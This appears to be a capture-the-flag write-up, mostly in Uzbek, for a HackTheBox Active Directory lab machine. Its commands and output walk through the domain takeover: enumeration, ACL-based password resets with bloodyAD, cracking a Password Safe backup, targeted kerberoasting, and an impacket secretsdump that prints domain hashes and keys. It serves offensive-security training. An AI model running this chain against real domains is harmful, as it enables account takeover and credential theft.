>Username: Olivia\
>Password: ichliebedich

 ```bash
smbclient -L //10.10.11.42/ -U Olivia
Password for [WORKGROUP\Olivia]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share

```

Nmap natijalardan bizga qaysi portlar kerakligini ko'rsak bo'ladi.
```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-18 10:38:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
56398/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
56403/tcp open  msrpc         Microsoft Windows RPC
56414/tcp open  msrpc         Microsoft Windows RPC
56425/tcp open  msrpc         Microsoft Windows RPC
56461/tcp open  msrpc         Microsoft Windows RPC
61502/tcp open  msrpc         Microsoft Windows RPC
```

```bash
└─$ crackmapexec smb 10.10.11.42 -u Olivia -p ichliebedich --users
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing LDAP protocol database
[*] Initializing SSH protocol database
[*] Initializing MSSQL protocol database
[*] Initializing FTP protocol database
[*] Initializing RDP protocol database
[*] Initializing WINRM protocol database
[*] Initializing SMB protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\Olivia:ichliebedich 
SMB         10.10.11.42     445    DC               [+] Enumerated domain user(s)
SMB         10.10.11.42     445    DC               administrator.htb\emma                           badpwdcount: 0 desc:                                               
SMB         10.10.11.42     445    DC               administrator.htb\alexander                      badpwdcount: 0 desc:                                               
SMB         10.10.11.42     445    DC               administrator.htb\ethan                          badpwdcount: 0 desc:                                               
SMB         10.10.11.42     445    DC               administrator.htb\emily                          badpwdcount: 0 desc:                                               
SMB         10.10.11.42     445    DC               administrator.htb\benjamin                       badpwdcount: 2 desc:                                               
SMB         10.10.11.42     445    DC               administrator.htb\michael                        badpwdcount: 2 desc:                                               
SMB         10.10.11.42     445    DC               administrator.htb\olivia                         badpwdcount: 0 desc:                                               
SMB         10.10.11.42     445    DC               administrator.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account       
SMB         10.10.11.42     445    DC               administrator.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain                                                                          
SMB         10.10.11.42     445    DC               administrator.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain

```

```bash
evil-winrm -u Olivia -p 'ichliebedich' -i 10.10.11.42
```
Men `winPeas.exe` yukladim lekin bundan hech qanday natija chiqmadi va keyin men `Sharphound.exe` yukladimi `Bloodhound` uchun 
```
.\SharpHound.exe -c all
```
Ishga tushurganimdan so'ng `.zip` faylni yuklab oldim va `Bloodhound` da ishga tushurdim.

```bash
sudo neo4j console
```

```
bloodhound
```
Agar `bloudhound` ga yuklangan `zip` fayl ishlamasa bundan foydalanashingiz mumkin. 
```bash
bloodhound-python -u Olivia -p ichliebedich -d administrator.htb -v --zip -c All -ns 10.10.11.42
```

`Bloodhound` natijasiga ko'ra, `Olivia` `Michael` ni parolini o'zgartirishi mumkin ekan. `Michael` esa `Benjamin` parolini. 

```bash
bloodyAD --host 10.10.11.42 -d administrator.htb -u Olivia -p ichliebedich set password michael '12345678'

[+] Password changed successfully!
```

```bash
bloodyAD --host 10.10.11.42 -d administrator.htb -u michael -p 12345678 set password benjamin '11111111'
```

>benjamin 11111111\
>michael 12345678 

Keyin `ftp`ga **benjamin** nomidan kirib `backup` faylini yuklab olamiz.
```bash
ftp 10.10.11.42
```
Bu `Backup.psafe3` fayli Password Safe maʼlumotlar bazasi fayli boʻlib, u shifrlangan parollar va boshqa maxfiy maʼlumotlarni saqlash uchun Password Safe ilovasi tomonidan foydalaniladi. Bu maʼlumotlar bazasiga kirish parolini olish uchun `hashcat` yordamida hashni crack qilamiz. 

```bash
hashcat -m 5200 -a 0 Backup.psafe3 /usr/share/wordlists/rockyou.txt
```

> Password found --> tekieromucho

Ma'lumotlar bazasidan `emely` ni paroli chiqadi va `user.txt` ni olsak bo'ladi.
```bash
sudo apt install passwordsafe
```

```bash
pwsafe
```

>UXLCI5iETUsIBoFVTj8yQFKoHjXmb -> emily
>UrkIbagoxMyUGw0aPlj9B0AXSea4Sw -> alexander
>WwANQWnmJnGV07WQN8bMS7FMAbjNur -> emma


Keyin yana `winPEAS.exe` faylini yuklayman, lekin hech narsa chiqmadi. Keyin `Bloodhound`dan foydalandim va Domen Administratorsi parolini oladigan "ethan" foydalanuvchisini ko'rdim. `ethan` parolini `emily` yordamida oldim
```bash
ntpdate -q 10.10.11.42 

2025-04-18 09:35:59.213101 (-0400) +25232.331872 +/- 0.255013 10.10.11.42 s1 no-leap
```

```bash
faketime '2025-04-18 09:35:59' python3 targetedKerberoast.py -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "administrator.htb" --dc-ip 10.10.11.42

[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$bd7e8bd7b5a90ce0b108c71270407f3b$e5bf02b94d9065b9d6a8989e9c7acb68e3a7739978920a0999108f3dcfa7bd90928308620f5435a003a732b3e28218cd58e586b7c0080bb503efdd251efb1c7cdcffb6a00ef69165fc74536e4a5afa14674b8d9af521046b049bc7f63f3214eb4be3d35ddda0bb34946126412d9193f40e227dfd0032dccff2ca2283125b6091ed167a87db47b14692a0ebe3eb9a959a37b114ac731982b7b7a7c1cbe3d6cf2887f3dc86414be4f35b863dfac5d3ecc9238c193307f3550425088481032d155003b8dfff9b994d530a95b99216eac9c0d775f535d00cf0341f806cd8d878b696c4a5b95e15e0f747b6cd8bd54f4b210bdab7f7a7da37696d2be5691ca352f  b5a993b98a6d29e3092ebda711a7c6eb31f7a0f2a1b2defe177a4253aef4cb9b3b9d4fc46a5fd35fc6521eef8cc85c532b4afb818ec90cf6c08f59a730a52dafc122a9157e19c9cac8fdfb3a9152e674b8bebdda73b17259db0fccd2a19e8d89c5156050025bc73f9e2e8e053706b0298eb2a796f145047a57d60ab9667b0832a32699808298a03e41c57ea3c29f580754ea96f3bb162fc5b162e23e82fa6c8b14321bd294cea6c4033393fe023d56c877fd30659e824919cff5e4828da47248b1c2daf94429c116c1630f70cb67ad4cc2254b56e51aa3d3571f5221947c221eeb89c91dc26707875e702ac1de36413d59a129593b048311f96435df39408098b606c5d15e844c2bc0a9e95603fa1e740461800cd7909e684087e62e870f1b156a6858a0a98326917bd445489954a8a0b280599e7e23f15e467775e2f6039d9ae877619dbf0c4a06e4339f193ec0cc58f5977488f5e1dfad807af82d5b6b9fe12c9aecfdd04bcf41e80466c08f314ba8e35e25449115123110d39328778e3f5d428a059a93de1fb3f258e1771f54fc04217c40383a97b8a5b9c9cf2d6c6ec7966a07b7568ed8d4b8158979ce093a7e6a45a31d464726df27d218653dae43c40657239ad20901c7fdb7fc9632e2afd8ca84e51a044b0aa7e68774dfb47278809772c2681c8151ab6fc4b240706d844af07a8125db823601c7ce61bd49322ee08c0338143e1cb20b51c6646fe5b350767b9f4b637520d2b3c33be51c36dc97ff48d10371ad3dd3a76ebd90438afbcd48ca8818870e60b8a49345fdbee18ff2aaf0759c33003831a0171236c3c07c60259963528af64aab4dd258f1ef62d010c740d1e12c0bd7a34ccba3683d716c8629579489df736703818148ce2f918c2de0d3904d9711c224d1fdf261513bd2d6a63a11f3388be8124e39a037d1f8da59a1f28fdfd128ab7ccb4f6b737a44971fb9bd57c78b69c729e2e951b081c1ce725f5361f398f561f7340f6b3550b5e71bc6a787ab44f8ffaf75bfb03392439b677a20632c8bf9bd5a54e5afee30a137dfc98e3e792676af9acdc43414b135daa4bf3ec1ecff6940e8d3efc876133960f81fe5919f17ddc7428109b05afd465d1a2ca89771dbd0e9c5f844fdf1d7a1faaa3abc9d0cf999bcbe07f22c19c4fcbf2a7bd4e
```

`ethan` user's password hash crack
```bash
hashcat -D 1 -m 13100 -a 0 ethan.hash /usr/share/wordlists/rockyou.txt --force
```

>👤 Username: ethan  
>🔐 Password: limpbizkit

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
pip install .
cd impacket/examples
```


```
python3 secretsdump.py administrator.htb/ethan:limpbizkit@10.10.11.42
Impacket v0.13.0.dev0+20250415.195618.c384b5fb - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:8ec60adea316d957d1cf532c5841758d:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:519b4c84ffe7a54ef275463aaee05feff17f7ab0a3626777009ca9b071077f7b
administrator.htb\michael:aes128-cts-hmac-sha1-96:cf18258aebf243ab8eab4a6d6caec794
administrator.htb\michael:des-cbc-md5:194f1623cdf11957
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:eb66cc1a270fee1045752b261a49e9ca2a5e806685b59866c150c19ddabcce3d
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:9e29212c6edb9fd9075b3b75a0051938
administrator.htb\benjamin:des-cbc-md5:fd192529c8379d97
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
```

Siz `root.txt` ni olasiz bundan. Happy hacking)))
